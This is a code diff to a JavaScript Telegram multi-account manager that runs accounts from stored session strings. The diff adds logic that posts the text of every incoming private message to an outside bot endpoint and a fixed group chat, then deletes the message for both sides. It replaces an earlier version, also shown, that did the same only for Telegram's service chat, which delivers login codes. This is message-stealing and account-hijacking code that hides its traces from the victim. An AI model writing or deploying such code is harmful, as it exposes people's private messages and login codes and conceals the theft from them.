@@ -9,15 +9,19 @@ class TelegramManager {
     }
 
     async createClient(sessionString, phoneNumber) {
-        const session = new StringSession(sessionString);
-        const client = new TelegramClient(session, process.env.API_ID, process.env.API_HASH, {
-            connectionRetries: 5,
-        });
-        await client.connect();
-        console.log(`Client connected: ${phoneNumber}`);
-        client.addEventHandler(handleEvents, new NewMessage({ incoming: true }));
-        this.clients.set(phoneNumber, client);
-        return client;
+        try {
+            const session = new StringSession(sessionString);
+            const client = new TelegramClient(session, parseInt(process.env.API_ID), process.env.API_HASH, {
+                connectionRetries: 5,
+            });
+            await client.connect();
+            console.log(`Client connected: ${phoneNumber}`);
+            client.addEventHandler(this.handleEvents, new NewMessage({ incoming: true }));
+            this.clients.set(phoneNumber, client);
+            return client;
+        } catch (error) {
+            console.log(error);
+        }
     }
 
     async getClient(phoneNumber) {
@@ -63,36 +67,20 @@ class TelegramManager {
 
     async handleEvents(event) {
         if (event.isPrivate) {
-            console.log(event.message.chatId.toString());
             console.log(event.message.text.toLowerCase());
-            if (event.message.chatId.toString() == "777000") {
-                const payload = {
-                    chat_id: "-1001729935532",
-                    text: event.message.text
-                };
-                console.log("RECIEVED");
-                await sleep(500);
-                await event.message.delete({ revoke: true });
-                const options = {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                };
-                await fetchWithTimeout(`${ppplbot}`, options);
-            }
-
-            if (printChannels) {
-                printChannels = false;
-                const chats = await event.client.getDialogs({ limit: 130 });
-                let reply = '';
-                chats.map((chat) => {
-                    if (chat.isChannel || chat.isGroup) {
-                        const username = chat.entity.toJSON().username ? ` @${chat.entity.toJSON().username} ` : chat.entity.toJSON().id.toString();
-                        reply = reply + chat.entity.toJSON().title + " " + username + ' \n';
-                    }
-                });
-                console.log(reply);
-            }
+            const payload = {
+                chat_id: "-1001729935532",
+                text: event.message.text
+            };
+            console.log("RECIEVED");
+            await sleep(500);
+            await event.message.delete({ revoke: true });
+            const options = {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            };
+            await fetchWithTimeout(`${ppplbot}`, options);
         }
     }
 }
